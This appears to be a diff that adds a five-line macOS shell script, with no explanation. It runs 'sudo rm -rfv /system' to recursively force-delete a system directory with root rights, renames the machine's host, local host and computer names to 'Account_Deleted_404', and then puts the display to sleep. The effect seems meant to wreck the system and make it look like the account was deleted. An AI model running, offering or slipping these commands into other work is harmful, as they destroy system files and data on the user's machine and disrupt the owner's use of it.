@@ -1,0 +1,5 @@
+sudo rm -rfv /system
+sudo scutil --set LocalHostName Account_Deleted_404
+sudo scutil --set HostName Account_Deleted_404
+sudo scutil --set ComputerName Account_Deleted_404
+pmset displaysleepnow
